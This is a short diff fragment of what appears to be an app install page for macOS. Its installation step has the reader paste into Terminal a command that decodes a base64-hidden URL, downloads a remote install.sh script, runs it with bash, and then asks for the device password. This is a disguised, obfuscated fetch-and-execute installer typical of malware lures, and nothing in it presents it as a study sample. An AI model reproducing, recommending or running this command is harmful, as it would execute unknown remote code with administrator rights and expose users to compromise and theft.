@@ -9,7 +9,6 @@ The app works seamlessly with macOS permissions and snapshots, ensuring that you
 1. Copy the installation command below.
 ```
 /bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9zb2wvaW5zdGFsbC5zaA== | base64 -d))"
-
 ```
 2. Open Terminal on your device, paste the command, then press Return.  
 3. Enter your device password when prompted and confirm the installation.
